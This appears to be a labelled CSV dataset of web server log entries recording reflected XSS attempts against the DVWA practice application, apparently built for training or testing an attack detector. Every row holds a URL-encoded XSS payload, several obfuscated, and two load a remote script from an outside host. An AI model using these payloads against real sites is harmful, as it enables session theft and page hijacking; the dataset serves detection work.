ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:48:34-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20xlink%3ahref%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1730,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20xlink%3ahref%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,156,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:36-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3ca%20xmlns%3axlink%3dhttp%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%20xlink%3ahref%3d%3f%3e%3ccircle%20r%3d400%20%2f%3e%3canimate%20attributeName%3dxlink%3ahref%20begin%3d0%20from%3djavascript%3aalert(1)%20to%3d%26%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1798,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3ca%20xmlns%3axlink%3dhttp%3a%2f%2fwww%2ew3%2eorg%2f1999%2fxlink%20xlink%3ahref%3d%3f%3e%3ccircle%20r%3d400%20%2f%3e%3canimate%20attributeName%3dxlink%3ahref%20begin%3d0%20from%3djavascript%3aalert(1)%20to%3d%26%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,315,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:39-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,127,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:41-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchend%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1716,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchend%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,125,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:43-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchmove%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchmove%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,126,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchcancel%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3chtml%20ontouchcancel%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,128,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onorientationchange%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onorientationchange%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:50-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e%2egif&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1723,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e%2egif&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,143,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:52-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%20onload%3d%22alert(document%2edomain)%22%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1751,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%20onload%3d%22alert(document%2edomain)%22%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,202,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:55-04:00,GET /DVWA/vulnerabilities/xss_r/?name=GIF89a%2f%2a%3csvg%2fonload%3dalert(1)%3e%2a%2f%3dalert(document%2edomain)%2f%2f%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1742,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=GIF89a%2f%2a%3csvg%2fonload%3dalert(1)%3e%2a%2f%3dalert(document%2edomain)%2f%2f%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,174,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:57-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%26comma%3balert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22data%3a%26comma%3balert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:00-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3ddata%3a%26comma%3balert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3ddata%3a%26comma%3balert(1)%2f%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,147,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1727,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3d%22%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,163,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:04-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3cscript%20src%3d%2f%2fbrutelogic%2ecom%2ebr%26sol%3b1%2ejs%26num%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,166,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dimport%20href%3d%22data%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1742,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3clink%20rel%3dimport%20href%3d%22data%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,216,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%22%3e%3clink%20rel%3dimport%20href%3ddata%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1743,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%22%3e%3clink%20rel%3dimport%20href%3ddata%3atext%2fhtml%26comma%3b%26lt%3bscript%26gt%3balert(1)%26lt%3b%26sol%3bscript%26gt%3b&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,219,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:12-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbase%20href%3d%2f%2f0%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbase%20href%3d%2f%2f0%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,118,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:14-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%2fsrc%3d%22data%3a%26comma%3beval(atob(location%2ehash%2eslice(1)))%2f%2f%23alert(1)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%2fsrc%3d%22data%3a%26comma%3beval(atob(location%2ehash%2eslice(1)))%2f%2f%23alert(1)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,185,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:17-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1714,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onload%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,121,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onpageshow%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onpageshow%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,125,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:22-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,122,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:24-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhashchange%3dalert(1)%3e%3ca%20href%3d%23x%3eclick%20this!%23x&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1735,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhashchange%3dalert(1)%3e%3ca%20href%3d%23x%3eclick%20this!%23x&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,165,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:27-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20style%3doverflow%3aauto%3bheight%3a1000px%20onscroll%3dalert(1)%20id%3dx%3e%23x&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1748,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20style%3doverflow%3aauto%3bheight%3a1000px%20onscroll%3dalert(1)%20id%3dx%3e%23x&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,180,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:29-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onscroll%3dalert(1)%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onscroll%3dalert(1)%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,155,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:32-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onresize%3dalert(1)%3epress%20F12!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onresize%3dalert(1)%3epress%20F12!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,135,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhelp%3dalert(1)%3epress%20F1!%20(MSIE)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1727,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cbody%20onhelp%3dalert(1)%3epress%20F1!%20(MSIE)&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,141,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:37-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20onstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,125,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20loop%3d1%20width%3d0%20onfinish%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1733,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20loop%3d1%20width%3d0%20onfinish%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,149,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:43-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,133,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:45-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cvideo%20onloadstart%3dalert(1)%3e%3csource%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cvideo%20onloadstart%3dalert(1)%3e%3csource%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,139,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:48-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cinput%20autofocus%20onblur%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1721,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cinput%20autofocus%20onblur%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:51-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ckeygen%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ckeygen%20autofocus%20onfocus%3dalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,136,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%20onsubmit%3dalert(1)%3e%3cinput%20type%3dsubmit%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%20onsubmit%3dalert(1)%3e%3cinput%20type%3dsubmit%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,150,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:56-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cselect%20onchange%3dalert(1)%3e%3coption%3e1%3coption%3e2&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1727,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cselect%20onchange%3dalert(1)%3e%3coption%3e1%3coption%3e2&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,151,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:49:59-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmenu%20id%3dx%20contextmenu%3dx%20onshow%3dalert(1)%3eright%20click%20me!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1737,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmenu%20id%3dx%20contextmenu%3dx%20onshow%3dalert(1)%3eright%20click%20me!&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,167,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:50:02-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%5cu0061%5cu006C%5cu0065%5cu0072%5cu0074(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1731,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3e%5cu0061%5cu006C%5cu0065%5cu0072%5cu0074(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,161,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:50:04-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3d%221%22%20onerror%3d%22%26%23x61%3b%26%23x6c%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b%22%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1747,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cimg%20src%3d%221%22%20onerror%3d%22%26%23x61%3b%26%23x6c%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x29%3b%22%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,237,5,116,XSS
